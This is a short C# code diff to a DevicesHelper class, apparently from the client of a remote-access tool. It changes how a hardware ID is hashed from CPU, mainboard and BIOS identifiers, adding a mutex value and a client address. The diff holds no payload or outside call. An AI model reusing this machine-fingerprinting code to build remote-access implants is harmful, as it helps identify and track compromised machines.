@@ -3,6 +3,7 @@ using System.Linq;
 using System.Management;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
+using xClient.Config;
 using xClient.Core.Cryptography;
 
 namespace xClient.Core.Helper
@@ -11,9 +12,14 @@ namespace xClient.Core.Helper
     {
         public static string HardwareId { get; private set; }
 
-        static DevicesHelper()
+        //static DevicesHelper()
+        //{
+        //    HardwareId = SHA256.ComputeHash(Settings.MUTEX + GetCpuName() + GetMainboardIdentifier() + GetBiosIdentifier());
+        //}
+
+        public static void ComputeId(String clientAddress)
         {
-            HardwareId = SHA256.ComputeHash(GetCpuName() + GetMainboardIdentifier() + GetBiosIdentifier());
+            HardwareId = SHA256.ComputeHash(Settings.MUTEX + clientAddress + GetCpuName() + GetMainboardIdentifier() + GetBiosIdentifier());
         }
 
         public static string GetBiosIdentifier()
